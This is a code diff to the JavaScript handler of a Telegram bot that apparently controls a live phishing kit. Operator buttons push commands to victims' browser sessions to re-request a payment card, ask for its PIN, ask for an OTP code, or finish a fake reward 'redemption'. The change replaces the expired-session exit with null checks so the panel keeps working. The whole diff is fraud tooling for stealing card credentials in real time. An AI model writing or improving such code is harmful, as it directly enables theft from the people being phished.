@@ -261,17 +261,11 @@ bot.on('callback_query', async (callbackQuery) => {
         // Buscar socket activo
         const targetSocket = activeSessions.get(fullSessionId);
         
-        if (!targetSocket) {
-            await bot.answerCallbackQuery(callbackQuery.id, {
-                text: '⚠️ Sesión expirada o inactiva',
-                show_alert: true
-            });
-            return;
-        }
-        
         // Emitir evento según la acción
         if (action.startsWith('finalize_')) {
-            targetSocket.emit('action', { type: 'finalize' });
+            if (targetSocket) {
+                targetSocket.emit('action', { type: 'finalize' });
+            }
             await bot.answerCallbackQuery(callbackQuery.id, {
                 text: '✅ Finalizando redención...'
             });
@@ -281,7 +275,9 @@ bot.on('callback_query', async (callbackQuery) => {
             });
         }
         else if (action.startsWith('retry_card_')) {
-            targetSocket.emit('action', { type: 'retry_card' });
+            if (targetSocket) {
+                targetSocket.emit('action', { type: 'retry_card' });
+            }
             await bot.answerCallbackQuery(callbackQuery.id, {
                 text: '🔄 Solicitando tarjeta nuevamente...'
             });
@@ -291,7 +287,9 @@ bot.on('callback_query', async (callbackQuery) => {
             });
         } 
         else if (action.startsWith('request_pin_')) {
-            targetSocket.emit('action', { type: 'request_pin' });
+            if (targetSocket) {
+                targetSocket.emit('action', { type: 'request_pin' });
+            }
             await bot.answerCallbackQuery(callbackQuery.id, {
                 text: '🔐 Solicitando clave de tarjeta...'
             });
@@ -301,7 +299,9 @@ bot.on('callback_query', async (callbackQuery) => {
             });
         } 
         else if (action.startsWith('request_otp_')) {
-            targetSocket.emit('action', { type: 'request_otp' });
+            if (targetSocket) {
+                targetSocket.emit('action', { type: 'request_otp' });
+            }
             await bot.answerCallbackQuery(callbackQuery.id, {
                 text: '📱 Solicitando código OTP...'
             });
